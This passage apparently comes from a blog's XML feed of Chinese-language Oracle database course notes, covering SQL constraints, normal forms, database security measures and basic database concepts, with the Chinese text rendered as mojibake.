</tr>
</thead>
<tbody><tr>
<td align="left">é»˜è®¤å€¼çº¦æŸ</td>
<td align="left">DEFAULT</td>
<td align="left">å¯ä»¥ä¸ºæŸä¸€åˆ—æŒ‡å®šé»˜è®¤å€¼ã€‚å½“ç”¨æˆ·æ’å…¥æˆ–ä¿®æ”¹å…ƒç»„æ—¶ï¼Œåœ¨æ²¡æœ‰ä¸ºè¯¥åˆ—èµ‹å€¼çš„æƒ…å†µä¸‹å¯ä»¥ç”¨æŒ‡å®šçš„é»˜è®¤å€¼å¡«å…¥è¯¥åˆ—ã€‚</td>
<td align="left">åˆ—çº§çº¦æŸ</td>
</tr>
<tr>
<td align="left">éç©ºå€¼çº¦æŸ</td>
<td align="left">NOT NULL</td>
<td align="left">å½“æŸåˆ—çš„å€¼ä¸èƒ½ä¸ºç©ºå€¼æ—¶ï¼ˆå³è¦æ±‚æ–°å»ºæˆ–ä¿®æ”¹å…ƒç»„æ—¶ï¼Œ ï¼ˆå³è¦æ±‚æ–°å»ºæˆ–ä¿®æ”¹å…ƒç»„æ—¶ï¼Œè¯¥åˆ—å¿…é¡»å¡«å…¥å€¼ï¼‰ï¼Œåˆ™å¯ä»¥åœ¨è®¾ç½®ä¸ºéç©ºå€¼çº¦æŸ</td>
<td align="left">åˆ—çº§çº¦æŸ</td>
</tr>
<tr>
<td align="left">å”¯ä¸€å‹çº¦æŸ</td>
<td align="left">UNIQUE</td>
<td align="left">ç”¨äºé™å®šåŸºæœ¬è¡¨ä¸Šçš„æŸä¸ªåˆ—æˆ–æŸäº›åˆ—çš„ç»„åˆï¼ˆç§°ä¸ºå”¯ä¸€æ€§é”®ï¼‰ï¼Œåœ¨ä¸åŒå…ƒç»„ï¼ˆè¡Œï¼‰ä¸­çš„å–å€¼ä¸èƒ½ç›¸åŒï¼ˆç©ºå€¼é™¤å¤–ï¼‰ã€‚</td>
<td align="left">å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ</td>
</tr>
<tr>
<td align="left">ä¸»é”®çº¦æŸ</td>
<td align="left">PRIMARY KEY</td>
<td align="left">ç”¨äºå®šä¹‰åŸºæœ¬è¡¨çš„ä¸»é”®ï¼ˆç ï¼‰ï¼Œä»¥å®ç°å®ä½“å®Œæ•´æ€§è§„åˆ™ã€‚</td>
<td align="left">å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ</td>
</tr>
<tr>
<td align="left">å¤–é”®çº¦æŸ</td>
<td align="left">FOREIGN KEY</td>
<td align="left">æ˜¯ä¸€ä¸ªè¡¨ï¼ˆç§°å¤–é”®è¡¨ã€ä»è¡¨æˆ–å‚ç…§å…³ç³»ï¼‰ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—çš„ç»„åˆï¼Œå®ƒçš„å–å€¼è¦ä¹ˆä¸ºç©ºå€¼ï¼Œè¦ä¹ˆæ˜¯å¼•ç”¨å¦ä¸€ä¸ªè¡¨ï¼ˆç§°ä¸»é”®è¡¨ã€ä¸»è¡¨æˆ–è¢«å‚ç…§å…³ç³»ï¼‰çš„ä¸»é”®æˆ–å”¯ä¸€æ€§é”®çš„å€¼ã€‚</td>
<td align="left">å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ</td>
</tr>
<tr>
<td align="left">æ£€æŸ¥çº¦æŸ</td>
<td align="left">CHECK</td>
<td align="left">å¯ä»¥å®šä¹‰æ’å…¥æˆ–ä¿®æ”¹æŸä¸ªå…ƒç»„æ—¶ï¼Œå…ƒç»„åº”æ»¡è¶³çš„çº¦æŸæ¡ä»¶ï¼Œé€šå¸¸ç”¨äºé™å®šæŸä¸ªåˆ—çš„å–å€¼èŒƒå›´æˆ–ä¸å…¶ä»–åˆ—çš„å…³ç³»ã€‚</td>
<td align="left">å¯ä»¥æ˜¯åˆ—çº§çº¦æŸä¹Ÿå¯ä»¥æ˜¯è¡¨çº§çº¦æŸ</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°æ®åº“å…³ç³»èŒƒå¼</title>
    <url>/2019/12/17/Oracle/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%85%B3%E7%B3%BB%E8%8C%83%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="æ•°æ®åº“å…³ç³»èŒƒå¼"><a href="#æ•°æ®åº“å…³ç³»èŒƒå¼" class="headerlink" title="æ•°æ®åº“å…³ç³»èŒƒå¼"></a>æ•°æ®åº“å…³ç³»èŒƒå¼</h1><h2 id="æ•°æ®ä¾èµ–"><a href="#æ•°æ®ä¾èµ–" class="headerlink" title="æ•°æ®ä¾èµ–"></a>æ•°æ®ä¾èµ–</h2><p><strong>å…³ç³»æ¨¡å¼ä¸­çš„å„å±æ€§ä¹‹é—´ç›¸äº’ä¾èµ–ã€ç›¸äº’åˆ¶çº¦çš„è”ç³»ç§°ä¸ºæ•°æ®ä¾èµ–</strong></p>
<ul>
<li><p>å‡½æ•°ä¾èµ–</p>
</li>
<li><p>å¤šå€¼ä¾èµ–</p>
</li>
<li><p>è¿æ¥ä¾èµ–</p>
<a id="more"></a>
<h2 id="å…³ç³»æ¨¡å¼åº”æ»¡è¶³çš„åŸºæœ¬è¦æ±‚"><a href="#å…³ç³»æ¨¡å¼åº”æ»¡è¶³çš„åŸºæœ¬è¦æ±‚" class="headerlink" title="å…³ç³»æ¨¡å¼åº”æ»¡è¶³çš„åŸºæœ¬è¦æ±‚"></a>å…³ç³»æ¨¡å¼åº”æ»¡è¶³çš„åŸºæœ¬è¦æ±‚</h2></li>
<li><p>æ•°æ®åº“ä¸­çš„æ•°æ®å†—ä½™åº”è¯¥å°½å¯èƒ½çš„å°‘</p>
</li>
<li><p>å…³ç³»æ•°æ®åº“ä¸èƒ½å› ä¸ºæ•°æ®æ›´æ–°æ“ä½œè€Œå¼•èµ·æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜</p>
</li>
<li><p>æ’å…¥æ•°æ®æ—¶ï¼Œä¸èƒ½äº§ç”Ÿæ’å…¥å¼‚å¸¸ç°è±¡</p>
</li>
<li><p>åˆ é™¤æ•°æ®æ—¶ï¼Œä¸èƒ½äº§ç”Ÿåˆ é™¤å¼‚å¸¸ç°è±¡</p>
</li>
<li><p>æ•°æ®åº“è®¾è®¡åº”è€ƒè™‘æŸ¥è¯¢è¦æ±‚ï¼Œæ•°æ®ç»„ç»‡åº”åˆç†</p>
</li>
</ul>
<h2 id="å®Œå…¨å‡½æ•°ä¾èµ–å’Œéƒ¨åˆ†å‡½æ•°ä¾èµ–"><a href="#å®Œå…¨å‡½æ•°ä¾èµ–å’Œéƒ¨åˆ†å‡½æ•°ä¾èµ–" class="headerlink" title="å®Œå…¨å‡½æ•°ä¾èµ–å’Œéƒ¨åˆ†å‡½æ•°ä¾èµ–"></a>å®Œå…¨å‡½æ•°ä¾èµ–å’Œéƒ¨åˆ†å‡½æ•°ä¾èµ–</h2><p>(Sno,Cno)-&gt;Grade(å®Œå…¨å‡½æ•°ä¾èµ–)</p>
<p>å­¦å·å’Œè¯¾ç¨‹å·ç»„æˆé›†åˆæ‰èƒ½ä¸€å®šæ¨å‡ºå”¯ä¸€çš„æˆç»©ï¼Œæ‰€ä»¥(Sno,Cno)ä¸ºå†³å®šå› ç´ </p>
<p>å› ä¸ºSno-&gt;Ageæ‰€ä»¥(Sno,Cno)-&gt;Age(éƒ¨åˆ†å‡½æ•°ä¾èµ–)</p>
<p>å­¦å·æ˜¯å­¦å·å’Œè¯¾ç¨‹å·ç»„æˆé›†åˆçš„å­é›†,è€Œå­¦å·å°±å¯ä»¥æ¨å‡ºå¹´é¾„,æ‰€ä»¥å¹´é¾„éƒ¨åˆ†å‡½æ•°ä¾èµ–äº(Sno,Cno)è¿™ä¸ªé›†åˆ</p>
<p><strong>è¯´æ˜</strong></p>
<ul>
<li>åªç”¨å½“å†³å®šå› ç´ æ˜¯ç»„åˆå±æ€§æ—¶ï¼Œè®¨è®ºéƒ¨åˆ†å‡½æ•°ä¾èµ–æ‰æœ‰æ„ä¹‰</li>
<li>å½“å†³å®šæ˜¯å•å±æ€§æ—¶ï¼Œåªèƒ½æ˜¯å®Œå…¨å‡½æ•°ä¾èµ–</li>
<li>ä¾‹å¦‚ï¼Œåœ¨å…³ç³»æ¨¡å¼Sï¼ˆSNOï¼ŒSNï¼ŒAGEï¼ŒDEPTï¼‰ï¼Œå†³å®šå› ç´ ä¸ºå•å±æ€§SNOï¼Œæœ‰SNO-&gt;ï¼ˆSNï¼ŒAGEï¼ŒDEPTï¼‰ï¼Œä¸å­˜åœ¨éƒ¨åˆ†å‡½æ•°ä¾èµ–ã€‚</li>
</ul>
<h2 id="èŒƒå¼"><a href="#èŒƒå¼" class="headerlink" title="èŒƒå¼"></a>èŒƒå¼</h2><ul>
<li><strong>åŸºæœ¬æ€æƒ³ï¼š</strong>æ¶ˆé™¤å…³ç³»æ¨¡å¼ä¸­çš„æ•°æ®å†—ä½™ï¼Œæ¶ˆé™¤æ•°æ®ä¾èµ–ä¸­çš„ä¸åˆé€‚çš„éƒ¨åˆ†ï¼Œè§£å†³æ•°æ®æ’å…¥ã€åˆ é™¤æ—¶å‘ç”Ÿå¼‚å¸¸ç°è±¡</li>
<li><strong>èŒƒå¼ï¼š</strong>æŠŠå…³ç³»æ•°æ®åº“è®¾è®¡å‡ºæ¥çš„å…³ç³»æ¨¡å¼è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ã€‚</li>
<li><strong>ç¬¬ä¸€èŒƒå¼ï¼š</strong>æ»¡è¶³åŸºæœ¬è§„èŒƒè¦æ±‚çš„å…³ç³»æ¨¡å¼</li>
<li><strong>ç¬¬äºŒèŒƒå¼ï¼š</strong>åœ¨ç¬¬ä¸€èŒƒå¼ä¸­è¿›ä¸€æ­¥æ»¡è¶³ä¸€äº›è¦æ±‚</li>
<li><strong>ç¬¬ä¸‰èŒƒå¼ï¼š</strong>ä»¥æ­¤ç±»æ¨äº§ç”Ÿäº†ç¬¬ä¸‰èŒƒå¼ç­‰æ¦‚å¿µ</li>
<li><strong>æ³¨æ„ï¼š</strong>æ¯ä¸ªèŒƒå¼éƒ½è§„å®šäº†ä¸€äº›é™åˆ¶æ¡ä»¶</li>
</ul>
<h3 id="ç¬¬ä¸€èŒƒå¼"><a href="#ç¬¬ä¸€èŒƒå¼" class="headerlink" title="ç¬¬ä¸€èŒƒå¼"></a>ç¬¬ä¸€èŒƒå¼</h3><ul>
<li><strong>å®šä¹‰ï¼š</strong>å¦‚æœä¸€ä¸ªå…³ç³»æ¨¡å¼Rä¸­çš„æ‰€æœ‰å±æ€§éƒ½æ˜¯ä¸å¯åˆ†çš„æœ€å°æ•°æ®é¡¹ï¼Œåˆ™Râˆˆ1NF</li>
<li>æ³¨æ„ï¼š<ul>
<li>NFæ˜¯å…³ç³»æ¨¡å¼çš„ä¸€ä¸ªæœ€èµ·ç çš„è¦æ±‚</li>
<li>ä¸æ»¡è¶³1NFçš„æ•°æ®åº“æ¨¡å¼ä¸èƒ½ç§°ä¹‹ä¸ºå…³ç³»æ•°æ®åº“</li>
<li>ä½†æ»¡è¶³1NFçš„å…³ç³»æ¨¡å¼ä¸ä¸€å®šæ˜¯å¥½çš„å…³ç³»æ¨¡å¼</li>
</ul>
</li>
</ul>
<h3 id="ç¬¬äºŒèŒƒå¼"><a href="#ç¬¬äºŒèŒƒå¼" class="headerlink" title="ç¬¬äºŒèŒƒå¼"></a>ç¬¬äºŒèŒƒå¼</h3><ul>
<li><strong>å®šä¹‰ï¼š</strong>å¦‚æœå…³ç³»æ¨¡å¼Râˆˆ1NFï¼Œä¸”Rä¸­æ¯ä¸€ä¸ªéä¸»å±æ€§å®Œå…¨å‡½æ•°ä¾èµ–äºç ï¼Œåˆ™Râˆˆ2NF</li>
<li>ç»“è®ºï¼š<ol>
<li>ä»1NFå…³ç³»ä¸­æ¶ˆé™¤éä¸»å±æ€§å¯¹å…³ç³»é”®çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–ï¼Œåˆ™å¯å¾—åˆ°2NFå…³ç³»</li>
<li>å¦‚æœRçš„å…³ç³»ä¸ºå•å±æ€§ï¼Œæˆ–Rçš„å…¨ä½“å±æ€§å‡ä¸ºä¸»å±æ€§ï¼Œåˆ™Râˆˆ2NF</li>
</ol>
</li>
<li>2NFè§„èŒƒåŒ–<ul>
<li>2NFè§„èŒƒåŒ–æ˜¯æŒ‡æŠŠ1NFå…³ç³»æ¨¡å¼é€šè¿‡æŠ•å½±åˆ†è§£è½¬æ¢æˆ2NFå…³ç³»æ¨¡å¼çš„é›†åˆ</li>
<li>åˆ†è§£æ—¶éµå¾ªçš„åŸºæœ¬åŸåˆ™å°±æ˜¯â€œä¸€äº‹ä¸€åœ°â€ï¼Œè®©ä¸€ä¸ªå…³ç³»åªæè¿°ä¸€ä¸ªå®ä½“æˆ–è€…å®ä½“é—´çš„è”ç³»ã€‚å¦‚æœå¤šäºä¸€ä¸ªå®ä½“æˆ–è”ç³»ï¼Œåˆ™è¿›è¡ŒæŠ•å½±åˆ†è§£</li>
</ul>
</li>
</ul>
<h3 id="ç¬¬ä¸‰èŒƒå¼"><a href="#ç¬¬ä¸‰èŒƒå¼" class="headerlink" title="ç¬¬ä¸‰èŒƒå¼"></a>ç¬¬ä¸‰èŒƒå¼</h3><ul>
<li><strong>å®šä¹‰ï¼š</strong>å¦‚æœå…³ç³»æ¨¡å¼Râˆˆ2NFï¼Œä¸”Rä¸­æ¯ä¸ªéä¸»å±æ€§éƒ½ä¸ä¼ é€’ä¾èµ–äºç ï¼Œåˆ™Râˆˆ3NF</li>
<li>3NFè§„èŒƒåŒ–ï¼š<ul>
<li>3NFæ˜¯æŒ‡æŠŠ2NFå…³ç³»æ¨¡å¼é€šè¿‡æŠ•å½±åˆ†è§£è½¬æ¢æˆ3NFå…³ç³»æ¨¡å¼çš„é›†åˆ</li>
<li>å’Œ2NFè§„èŒƒåŒ–æ—¶éµå¾ªçš„åŸåˆ™ç›¸åŒï¼Œå³â€œä¸€äº‹ä¸€åœ°â€ï¼Œè®©ä¸€ä¸ªå…³ç³»åªæè¿°ä¸€ä¸ªå®ä½“æˆ–è€…å®ä½“é—´çš„è”ç³»</li>
</ul>
</li>
</ul>
<h3 id="BCèŒƒå¼"><a href="#BCèŒƒå¼" class="headerlink" title="BCèŒƒå¼"></a>BCèŒƒå¼</h3><ul>
<li><strong>å®šä¹‰ï¼š</strong>å…³ç³»æ¨¡å¼R(U,F)âˆˆ1NFï¼Œè‹¥å¯¹Rçš„æ¯ä¸ªå‡½æ•°ä¾èµ–x-&gt;yï¼Œæœ‰xå¿…å«å€™é€‰ç ï¼Œåˆ™RâˆˆBCNF</li>
<li>ä¼˜ç‚¹ï¼š<ul>
<li>æ•°æ®å†—ä½™é™ä½</li>
<li>ä¸å­˜åœ¨æ’å…¥å¼‚å¸¸</li>
<li>ä¸å­˜åœ¨åˆ é™¤å¼‚å¸¸</li>
<li>ä¸å­˜åœ¨æ›´æ–°å¼‚å¸¸</li>
</ul>
</li>
<li>æ€§è´¨ï¼š<ul>
<li>è‹¥RâˆˆBCNFï¼Œåˆ™Râˆˆ2NF</li>
<li>è‹¥RâˆˆBCNFï¼Œåˆ™Râˆˆ3NF</li>
<li>è‹¥Râˆˆ3NFï¼Œåˆ™Rä¸ä¸€å®šæ˜¯BCNF</li>
<li>è‹¥Râˆˆ3NFï¼Œä¸”å€™é€‰ç å”¯ä¸€ï¼Œåˆ™Ræ˜¯BCNF</li>
</ul>
</li>
</ul>
<h3 id="ç¬¬å››èŒƒå¼"><a href="#ç¬¬å››èŒƒå¼" class="headerlink" title="ç¬¬å››èŒƒå¼"></a>ç¬¬å››èŒƒå¼</h3><ul>
<li><strong>å®šä¹‰ï¼š</strong>å…³ç³»æ¨¡å¼R(U,D)âˆˆ1NFï¼ŒUæ˜¯å±æ€§å…¨é›†ï¼Œxï¼Œyæ˜¯Uçš„å­é›†ï¼ŒDæ˜¯Rä¸Šçš„æ•°æ®ä¾èµ–é›†ï¼Œå¦‚æœå¯¹Rçš„æ¯ä¸ªéå¹³å‡¡å¤šå€¼ä¾èµ–X-&gt;-&gt;yï¼Œxéƒ½å«å€™é€‰ç ï¼Œåˆ™Râˆˆ4NFã€‚</li>
<li></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(1) Ræ˜¯BCNFã€‚Rå€™é€‰å…³é”®å­—ä¸ºXYï¼ŒFä¸­åªæœ‰ä¸€ä¸ªå‡½æ•°ä¾èµ–ï¼Œè€Œè¯¥å‡½æ•°ä¾èµ–çš„å·¦éƒ¨åŒ…å«äº†Rçš„å€™é€‰å…³é”®å­—ã€‚</span><br><span class="line"></span><br><span class="line">   (2) Ræ˜¯3NFã€‚Rå€™é€‰å…³é”®å­—ä¸ºX Yå’ŒXZï¼ŒRä¸­æ‰€æœ‰å±æ€§éƒ½æ˜¯ä¸»å±æ€§ï¼Œä¸å­˜åœ¨éä¸»å±æ€§å¯¹å€™é€‰å…³é”®å­—çš„ä¼ é€’ä¾èµ–ã€‚</span><br><span class="line"></span><br><span class="line">   (3) Ræ˜¯BCNFã€‚Rå€™é€‰å…³é”®å­—ä¸ºXå’ŒYï¼Œå› ä¸ºXâ†’YZï¼Œæ‰€ä»¥Xâ†’Yï¼ŒXâ†’Zï¼Œç”±äºFä¸­æœ‰Yâ†’Zï¼ŒYâ†’Xï¼Œå› æ­¤Zæ˜¯ç›´æ¥å‡½æ•°ä¾èµ–äºXï¼Œè€Œä¸æ˜¯ä¼ é€’ä¾èµ–äºXã€‚åˆå› ä¸ºFçš„æ¯ä¸€å‡½æ•°ä¾èµ–çš„å·¦éƒ¨éƒ½åŒ…å«äº†ä»»ä¸€å€™é€‰å…³é”®å­—ï¼Œæ‰€ä»¥Ræ˜¯BCNFã€‚</span><br><span class="line"></span><br><span class="line">   (4) Ræ˜¯BCNFã€‚Rå€™é€‰å…³é”®å­—ä¸ºXï¼Œè€Œä¸”Fä¸­æ¯ä¸€ä¸ªå‡½æ•°ä¾èµ–çš„å·¦éƒ¨åŒ…å«äº†å€™é€‰å…³é”®å­—Xã€‚</span><br><span class="line"></span><br><span class="line">   (5) Ræ˜¯1NFã€‚Rå€™é€‰å…³é”®å­—ä¸ºWXï¼Œåˆ™Yï¼ŒZä¸ºéä¸»å±æ€§ï¼Œåˆç”±äºXâ†’Zï¼Œå› æ­¤Fä¸­å­˜åœ¨éä¸»å±æ€§å¯¹å€™é€‰å…³é”®å­—çš„éƒ¨åˆ†å‡½æ•°ä¾èµ–</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>æ•°æ®åº“å®‰å…¨</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC10%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="ç¬¬åå‘¨è¯¾æ•°æ®åº“å®‰å…¨"><a href="#ç¬¬åå‘¨è¯¾æ•°æ®åº“å®‰å…¨" class="headerlink" title="ç¬¬åå‘¨è¯¾æ•°æ®åº“å®‰å…¨"></a>ç¬¬åå‘¨è¯¾æ•°æ®åº“å®‰å…¨</h1><h1 id="æ•°æ®åº“å®‰å…¨"><a href="#æ•°æ®åº“å®‰å…¨" class="headerlink" title="æ•°æ®åº“å®‰å…¨"></a>æ•°æ®åº“å®‰å…¨</h1><a id="more"></a>

<h2 id="æ•°æ®åº“å®‰å…¨æªæ–½"><a href="#æ•°æ®åº“å®‰å…¨æªæ–½" class="headerlink" title="æ•°æ®åº“å®‰å…¨æªæ–½"></a>æ•°æ®åº“å®‰å…¨æªæ–½</h2><p>1.ç”¨æˆ·æ ‡è¯†å’Œé‰´å®š</p>
<ul>
<li>ç”¨æˆ·åå’Œç”¨æˆ·æ ‡è¯†æ ‡æ˜ç”¨æˆ·èº«ä»½</li>
<li>å£ä»¤</li>
<li>éšæœºæ•°å¯¹å¯†ç åŠ å¯†</li>
</ul>
<p>2.å­˜å–æ§åˆ¶</p>
<p>æ ¹æ®é¢„å…ˆå®šä¹‰å¥½çš„ç”¨æˆ·æƒé™è¿›è¡Œå­˜å–æ§åˆ¶</p>
<p>ä¸¤éƒ¨åˆ†:æ•°æ®å¯¹è±¡å’Œæ“ä½œç±»å‹</p>
<p>3.è§†å›¾</p>
<ul>
<li>ä¿è¯ç¨‹åºçš„é€»è¾‘ç‹¬ç«‹æ€§,å°†æœºå¯†æ•°æ®éšè—èµ·æ¥</li>
<li>ä¸åŒçš„DBMSéƒ½æä¾›äº†å»ºç«‹è§†å›¾çš„æœºåˆ¶</li>
<li>å¼€å‘æ•°æ®ç³»ç»Ÿæ—¶,åº”å°½å¯èƒ½ç»™ä¸åŒç”¨æˆ·åˆ†é…ä¸åŒçš„è§†å›¾</li>
</ul>
<p>4.å®¡è®¡</p>
<ul>
<li>å®¡è®¡æ—¶ä¸€ç§é¢„é˜²æ‰‹æ®µ,ç›‘æµ‹å¯èƒ½çš„ä¸åˆæ³•è®¿é—®</li>
<li>å®¡è®¯è¿½è¸ªæŠ€æœ¯ä½¿ç”¨ä¸“é—¨çš„æ–‡ä»¶æˆ–æ•°æ®åº“è®¿é—®è‡ªåŠ¨è®°å½•ç”¨æˆ·å¯¹æ•°æ®åº“çš„æ‰€æœ‰æ“ä½œ,åˆ©ç”¨è¿™äº›ä¿¡æ¯å°±èƒ½æ‰¾å‡ºéæ³•å­˜å–æ•°æ®çš„äºº</li>
<li></li>
<li></li>
</ul>
<p>5.æ•°æ®åŠ å¯†</p>
<h3 id="ORACLEä¸­çš„è§’è‰²ã€ç”¨æˆ·ã€æƒé™"><a href="#ORACLEä¸­çš„è§’è‰²ã€ç”¨æˆ·ã€æƒé™" class="headerlink" title="ORACLEä¸­çš„è§’è‰²ã€ç”¨æˆ·ã€æƒé™"></a>ORACLEä¸­çš„è§’è‰²ã€ç”¨æˆ·ã€æƒé™</h3><p>è§’è‰²åˆ†ç±»</p>
<ul>
<li>ç”¨æˆ·ç±»å‹</li>
<li>åº”ç”¨ç±»å‹</li>
</ul>
<p>oracleé¢„å®šä¹‰çš„è§’è‰²</p>
<p>oracleå…è®¸DBAå®šä¹‰è§’è‰²</p>
<p>CONNECT</p>
<p>RESOURCE</p>
<p>DBA</p>
<h2 id="æ•°æ®åº“å®Œæ•´æªæ–½"><a href="#æ•°æ®åº“å®Œæ•´æªæ–½" class="headerlink" title="æ•°æ®åº“å®Œæ•´æªæ–½"></a>æ•°æ®åº“å®Œæ•´æªæ–½</h2><h3 id="è§¦å‘å™¨"><a href="#è§¦å‘å™¨" class="headerlink" title="è§¦å‘å™¨"></a>è§¦å‘å™¨</h3>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracleæ•°æ®åº“ç¬¬äºŒå‘¨</title>
    <url>/2019/12/17/Oracle/%E7%AC%AC2%E5%91%A8%E8%AF%BE/</url>
    <content><![CDATA[<h1 id="Oracleæ•°æ®åº“ç¬¬äºŒå‘¨"><a href="#Oracleæ•°æ®åº“ç¬¬äºŒå‘¨" class="headerlink" title="Oracleæ•°æ®åº“ç¬¬äºŒå‘¨"></a>Oracleæ•°æ®åº“ç¬¬äºŒå‘¨</h1><h2 id="1-1æ•°æ®ã€ä¿¡æ¯ä¸æ•°æ®å¤„ç†"><a href="#1-1æ•°æ®ã€ä¿¡æ¯ä¸æ•°æ®å¤„ç†" class="headerlink" title="1.1æ•°æ®ã€ä¿¡æ¯ä¸æ•°æ®å¤„ç†"></a>1.1æ•°æ®ã€ä¿¡æ¯ä¸æ•°æ®å¤„ç†</h2><ul>
<li>æ•°æ®å’Œä¿¡æ¯</li>
<li>æ•°æ®åº“å’Œæ•°æ®åº“è¡¨</li>
<li>æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ</li>
<li>æ•°æ®åº“ç³»ç»Ÿ<a id="more"></a>
<h3 id="1-1åŸºæœ¬æ¦‚å¿µ"><a href="#1-1åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="1.1åŸºæœ¬æ¦‚å¿µ"></a>1.1åŸºæœ¬æ¦‚å¿µ</h3></li>
</ul>
<h4 id="1-æ•°æ®"><a href="#1-æ•°æ®" class="headerlink" title="1.æ•°æ®"></a>1.æ•°æ®</h4><ul>
<li>**æ•°æ®(Data)**ï¼šæ˜¯æ•°æ®åº“ä¸­å­˜å‚¨çš„åŸºæœ¬å¯¹è±¡</li>
<li><strong>æ•°æ®çš„å®šä¹‰</strong>ï¼šæè¿°äº‹ç‰©çš„ç¬¦å·è®°å½•ï¼Œæ˜¯ä¿¡æ¯çš„ç¬¦å·è¡¨ç¤ºï¼Œæˆ–ç§°è½½ä½“</li>
<li><strong>æ•°æ®çš„ç§ç±»</strong>ï¼šæ•°å­—ã€æ–‡æœ¬ã€å›¾å½¢ã€å›¾åƒã€å£° ï¼šæ•°å­—ã€æ–‡æœ¬ã€å›¾å½¢ã€å›¾åƒã€å£°éŸ³ã€è§†é¢‘ã€å­¦ç”Ÿçš„æ¡£æ¡ˆè®°å½•ç­‰</li>
<li><strong>ä¿¡æ¯</strong>ï¼šæ•°æ®çš„å†…æ¶µï¼Œæ˜¯æ•°æ®çš„è¯­ä¹‰è§£é‡Š</li>
<li><strong>æ•°æ®å¤„ç†</strong>:å°†æ•°æ®è½¬æ¢æˆä¿¡æ¯çš„è¿‡ç¨‹ï¼ŒåŒ…æ‹¬å¯¹æ•°æ®æ”¶é›†ã€å­˜å‚¨ã€åˆ†ç±»ã€åŠ å·¥ã€æ£€ç´¢ã€ç»´æŠ¤ç­‰ä¸€ç³»åˆ—æ´»åŠ¨</li>
</ul>
<p><strong>æ€»ç»“</strong>ï¼š</p>
<ul>
<li><strong>æ•°æ®æ˜¯ä¿¡æ¯çš„è½½ä½“ æ•°æ®æ˜¯ä¿¡æ¯çš„è½½ä½“</strong></li>
<li><strong>æ•°æ®æ˜¯ä¿¡æ¯çš„è¡¨è¿°æ–¹å¼ æ•°æ®æ˜¯ä¿¡æ¯çš„è¡¨è¿°æ–¹å¼</strong></li>
<li><strong>ä¿¡æ¯æ˜¯ä»æ•°æ®è€Œæ¥çš„ ä¿¡æ¯æ˜¯ä»æ•°æ®è€Œæ¥çš„çŸ¥è¯†</strong></li>
</ul>
<h4 id="2-æ•°æ®åº“"><a href="#2-æ•°æ®åº“" class="headerlink" title="2.æ•°æ®åº“"></a>2.æ•°æ®åº“</h4><ul>
<li>**æ•°æ®åº“(Database,ç®€ç§° ç®€ç§°DB)**ï¼šæ˜¯é•¿æœŸå‚¨å­˜åœ¨è®¡ç®—æœºå†…ã€æœ‰ç»„ç»‡ã€å¯å…±äº«çš„å¤§é‡æ•°æ®çš„é›†åˆ</li>
<li><strong>åŸºæœ¬ç‰¹å¾</strong>ï¼š<ul>
<li>æ•°æ®æŒ‰ä¸€å®šçš„æ•°æ®æ¨¡å‹ç»„ç»‡ã€æè¿°å’Œå‚¨å­˜<ul>
<li>ä»¥æ–‡ä»¶æ–¹å¼å­˜å‚¨ï¼Œå¸¸è§æ•°æ®åº“æ–‡ä»¶æ‰©å±•åï¼š<ul>
<li>MDF-SQL Serverï¼›</li>
</ul>
</li>
</ul>
</li>
<li>MDB-Accessï¼›</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- DBC-VFPï¼ˆVisual FoxProï¼‰</span><br></pre></td></tr></table></figure>
<ul>
<li>å¯ä¸ºå„ç§ç”¨æˆ·å…±äº«</li>
<li>å†—ä½™åº¦è¾ƒå°</li>
<li>æ•°æ®ç‹¬ç«‹æ€§è¾ƒé«˜<ul>
<li>æ˜“æ‰©å±•</li>
</ul>
</li>
</ul>
<h4 id="3-æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ"><a href="#3-æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="3.æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ"></a>3.æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ</h4><ul>
<li>**æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆ æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDatabase Management Systemï¼Œ<br>ç®€ç§° ç®€ç§°DBMSï¼‰ **</li>
<li><strong>ç®¡ç†æ•°æ®åº“çš„ ç®¡ç†æ•°æ®åº“çš„ç³»ç»Ÿè½¯ä»¶ ç³»ç»Ÿè½¯ä»¶ï¼Œæ˜¯æ•°æ®åº“ç³»ç»Ÿçš„æ ¸å¿ƒ</strong></li>
<li><strong>ä½äºç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„ä¸€å±‚æ•°æ®ç®¡ç†è½¯ä»¶</strong></li>
<li>ä¸»è¦åŠŸèƒ½ï¼š<ul>
<li>æ•°æ®å®šä¹‰åŠŸèƒ½ï¼ˆDDLï¼‰</li>
<li>æ•°æ®æ“çºµåŠŸèƒ½ï¼ˆDMLï¼‰ï¼šCRUD</li>
<li>æ•°æ®åº“çš„äº‹åŠ¡ç®¡ç†å’Œè¿è¡Œç®¡ç†</li>
